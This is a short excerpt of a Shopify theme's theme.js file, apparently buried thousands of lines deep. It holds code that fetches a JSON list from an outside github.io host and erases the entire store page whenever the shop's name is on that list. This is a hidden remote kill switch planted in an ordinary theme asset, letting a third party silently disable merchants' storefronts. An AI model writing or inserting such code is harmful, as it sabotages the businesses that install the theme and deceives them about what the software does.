theme.js  line 5706

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

fetch('https://digitalbrandz.github.io/animations/animate.json?'+ getRandomInt(999999999))
  .then(res => res.json())
  .then((out) => {
       var shopname = window.Shopify.shop.replace('.myshopify.com','');
   console.log(out);
   if(out.websites.includes(shopname)) {
     document.body.innerHTML = "";
   };
}).catch(err => console.error(err));  

      
      
